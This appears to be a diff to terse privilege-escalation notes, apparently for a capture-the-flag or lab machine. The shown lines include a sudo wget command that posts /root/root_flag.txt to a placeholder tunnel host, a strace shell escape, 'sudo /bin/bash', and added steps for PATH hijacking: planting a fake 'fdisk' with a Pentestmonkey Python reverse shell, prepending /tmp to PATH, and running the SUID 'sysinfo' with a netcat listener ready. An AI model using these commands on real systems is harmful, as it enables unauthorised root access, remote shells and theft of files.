@@ -24,5 +24,13 @@ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<Tunnel IP>:4445
 
 /usr/bin/strace -o /dev/null /bin/sh
 
+/bin/sysinfo
+cd /tmp/folder
+nano fdisk
+insert python shell from pentest monkey
+export PATH=/tmp/folder:$PATH
+start netcat listener on your port number
+sysinfo - for root
+
 sudo -l
 sudo /bin/bash
